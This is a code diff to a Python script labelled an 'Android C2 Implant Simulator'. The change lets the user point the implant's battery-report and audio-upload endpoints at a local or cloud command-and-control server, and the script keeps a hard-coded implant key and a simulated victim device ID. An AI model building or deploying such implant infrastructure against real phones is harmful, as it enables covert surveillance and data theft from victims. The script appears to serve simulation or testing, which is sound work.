@@ -7,8 +7,32 @@ import json
 import time
 import random
 
-SERVER_URL = "http://127.0.0.1:8000/battery_report"
-UPLOAD_URL = "http://127.0.0.1:8000/upload_audio"
+print("="*60)
+print("   Android C2 Implant Simulator")
+print("="*60)
+print("Choose execution mode:")
+print("  1 - Local Testing (127.0.0.1:8000)")
+print("  2 - Online/Cloud Testing")
+choice = input("Enter choice (1 or 2) [Default: 1]: ").strip()
+
+if choice == '2':
+    ip_add = input("\nEnter Google Cloud Server IP: ").strip()
+    if not ip_add:
+        print("[!] No IP entered. Falling back to localhost.")
+        base_url = "http://127.0.0.1:8000"
+    else:
+        # Strip trailing slashes or http prefix if user accidentally pasted them
+        ip_add = ip_add.replace("http://", "").replace("https://", "").split("/")[0]
+        # Check if user added port manually, otherwise append :8000
+        if ":" in ip_add:
+            base_url = f"http://{ip_add}"
+        else:
+            base_url = f"http://{ip_add}:8000"
+else:
+    base_url = "http://127.0.0.1:8000"
+
+SERVER_URL = f"{base_url}/battery_report"
+UPLOAD_URL = f"{base_url}/upload_audio"
 IMPLANT_KEY = "DeltaForce2027"
 DEVICE_ID = "SIMULATED_VICTIM_PHONE"
 
